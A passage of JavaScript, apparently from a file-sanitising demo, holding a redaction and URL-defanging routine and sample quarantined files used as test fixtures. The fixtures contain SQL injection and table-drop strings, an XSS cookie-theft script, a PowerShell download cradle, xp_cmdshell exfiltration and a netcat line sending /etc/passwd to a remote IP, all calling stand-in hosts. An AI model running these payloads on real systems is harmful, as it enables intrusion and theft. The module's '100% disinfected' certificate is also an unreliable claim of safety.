    if (redactSecrets) {
      if (/AKIA[0-9A-Z]{16}/.test(modified)) {
        modified = modified.replace(/AKIA[0-9A-Z]{16}/g, 'AKIA[REDACTED_AWS_KEY_SAFE]');
        reasons.push('Redacted AWS Access Key ID');
      }
      if (/ghp_[0-9a-zA-Z]{36}/.test(modified)) {
        modified = modified.replace(/ghp_[0-9a-zA-Z]{36}/g, 'ghp_[REDACTED_GITHUB_TOKEN]');
        reasons.push('Redacted GitHub Personal Access Token');
      }
      if (/(eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,})/.test(modified)) {
        modified = modified.replace(/(eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,})/g, '[REDACTED_JWT_TOKEN_SEALED]');
        reasons.push('Redacted Exposed JWT Bearer Token');
      }
    }

    // Defang Malicious URLs
    if (mode === 'DEFANG_ONLY' && /https?:\/\//i.test(modified) && (modified.includes('c2') || modified.includes('evil') || modified.includes('attacker') || modified.includes('exfil'))) {
      modified = modified.replace(/http:\/\//gi, 'hXXp://').replace(/https:\/\//gi, 'hXXps://').replace(/\./g, '[.]');
      reasons.push('Defanged C2 Exfiltration URL');
    }

    rectifiedLines.push(modified);

    if (modified !== line || reasons.length > 0) {
      changesCount++;
      diffs.push({
        line: lineNum,
        original: line,
        rectified: modified,
        changeType: reasons[0] || 'SANITIZED',
        reason: reasons.join(' & ')
      });
    }
  });

  const rectifiedContent = rectifiedLines.join('\n');
  const newEntropy = calculateEntropy(rectifiedContent);
  const newHash = simulateCryptoHash(rectifiedFileName + rectifiedContent.length + rectifiedContent.slice(0, 500));
  const certId = `CERT-DISINFECT-${Math.floor(100000 + Math.random() * 900000)}`;

  const certificate = {
    certId,
    timestamp: new Date().toISOString(),
    originalFileName: originalName,
    rectifiedFileName,
    originalHash: fileItem.hash || simulateCryptoHash(originalName),
    rectifiedHash: newHash,
    originalEntropy: fileItem.entropy || calculateEntropy(originalContent),
    rectifiedEntropy: newEntropy,
    threatsNeutralized: changesCount,
    complianceStatus: '100% DISINFECTED & VERIFIED SAFE',
    sealSignature: `SENTINEL-SEAL-${simulateCryptoHash(rectifiedContent + certId).substring(0, 16).toUpperCase()}`
  };

  return {
    rectifiedContent,
    rectifiedFileName,
    diffs,
    changesCount,
    newEntropy,
    newHash,
    certificate,
    isClean: true
  };
}

/**
 * Built-in Sample Files for Immediate Testing in Vault
 */
export const SAMPLE_VAULT_FILES = [
  {
    id: 'f1',
    name: 'customer_orders_exploit.csv',
    size: '1.24 MB',
    type: 'CSV Dataset',
    entropy: 4.85,
    hash: 'sha256$8f910a72c19e34b1a',
    status: 'CRITICAL (SQLi Tautology + XSS Hook + Exposed PAN)',
    date: '2026-09-08 19:30',
    quarantined: true,
    content: `id,customer_name,email,address,payment_card,notes
REC-101,David Miller,david.miller@corp.net,"742 Evergreen Terrace, Springfield",4532-8912-3456-7890,Standard customer
REC-102,"Robert'); DROP TABLE orders;--",bobby.tables@exploit.io,"10 Downing St' OR '1'='1",4111-2222-3333-4444,SELECT * FROM sys_admin_credentials WHERE 'a'='a'
REC-103,Elena Rostova,elena@quantum-ai.org,"450 Silicon Avenue",4000-1234-5678-9010,<script>fetch("https://attacker-c2.net/steal?d=" + document.cookie)</script>
REC-104,Marcus Vance,mvance@fintech-global.com,"12 Financial Plaza",4532 8912 3456 7890,VIP customer credit line
REC-105,Anonymous Query,anon@ghost.onion,"admin' UNION SELECT 1,password_hash,api_key FROM users--",4916-0000-1111-2222,<svg/onload=alert("XSS_COMPROMISE")>
REC-106,Tech Admin Probe,probe@devops-test.internal,; EXEC xp_cmdshell("powershell.exe -enc JAB...")--,4242-4242-4242-4242,POST /v2/data payload=eyJhbGciOiJIUzI1NiJ9...
REC-107,Sarah Connor,sconnor@cyberdyne.sec,"99 Resistance Way, Los Angeles",4000-8888-9999-1111,Security audit complete`
  },
  {
    id: 'f2',
    name: 'invoice_october_2026.pdf.exe',
    size: '840 KB',
    type: 'Executable Binary Masquerade',
    entropy: 7.85,
    hash: 'sha256$f41a82910cbe9013d',
    status: 'MALICIOUS (Double Extension + High Entropy Trojan)',
    date: '2026-09-08 19:35',
    quarantined: true,
    content: `%PDF-1.7\r\n# EMBEDDED_TROJAN_STUB: powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://evil-c2.su/payload.ps1')"\r\n\x00\x00\x00\x00MZ99018442819842109841298412894182941829481928491829481928491829481928419284`
  },
  {
    id: 'f3',
    name: 'database_migration_dump.sql',
    size: '5.6 MB',
    type: 'SQL Script',
    entropy: 5.12,
    hash: 'sha256$910ea82110c4f892a',
    status: 'CRITICAL (Destructive DROP TABLE + xp_cmdshell + Hardcoded Passwords)',
    date: '2026-09-08 19:40',
    quarantined: true,
    content: `-- SENTINEL Database Migration Script
USE master;
INSERT INTO accounts (id, user_name, db_pass, role) VALUES (1, 'admin_master', 'SuperSecretPass2026!', 'root');
SELECT * FROM users WHERE username = 'admin' OR 1=1;
; DROP TABLE audit_security_logs;
; EXEC xp_cmdshell('powershell.exe -c "Invoke-WebRequest http://exfil-vault.net -Method POST"');
SELECT id, email FROM customers WHERE 'a'='a';`
  },
  {
    id: 'f4',
    name: 'stealth_c2_beacon.ps1',
    size: '12 KB',
    type: 'PowerShell Script',
    entropy: 6.94,
    hash: 'sha256$2b4198c001f7823e4',
    status: 'SUSPICIOUS (Obfuscated Base64 Shell & C2 Callback)',
    date: '2026-09-08 19:45',
    quarantined: true,
    content: `# Obfuscated C2 Beacon
$b64 = "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQIA"
powershell.exe -enc $b64
cat /etc/passwd | nc 45.33.32.156 4444`
  },
  {
    id: 'f5',
    name: 'app_config_credentials.json',
    size: '4 KB',
    type: 'JSON Config',
    entropy: 4.21,
    hash: 'sha256$512fa901239ab812f',
    status: 'HIGH RISK (Exposed AWS Key & JWT Secret)',
    date: '2026-09-08 19:50',
    quarantined: true,
    content: `{
  "app_name": "SentinelEnterpriseBackend",
  "environment": "production",
  "aws_access_key": "AKIAIOSFODNN7EXAMPLE",
  "github_token": "ghp_1234567890abcdef1234567890abcdef1234",
  "jwt_secret": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIn0.TJVA95OrM7E20RMHrHDcEfxjoYZgeFONFh7HgQ",
  "db_connection": "postgres://admin:SuperSecretPass2026@db-prod.internal:5432/main"
}`
  },
  {
    id: 'f6',
    name: 'verified_clean_telemetry.csv',
    size: '3.1 MB',
    type: 'CSV Dataset',
    entropy: 3.42,
    hash: 'sha256$110ea82110c4f892a',
    status: 'CLEAN (100% Hardened & Certified)',
    date: '2026-09-08 19:55',
    quarantined: false,
    content: `timestamp,client_ip,request_path,status_code,latency_ms
2026-09-08T10:00:00Z,192.168.1.50,/api/v1/health,200,12
2026-09-08T10:00:01Z,192.168.1.51,/api/v1/products,200,45
2026-09-08T10:00:02Z,192.168.1.52,/api/v1/metrics,200,18`
  }
];
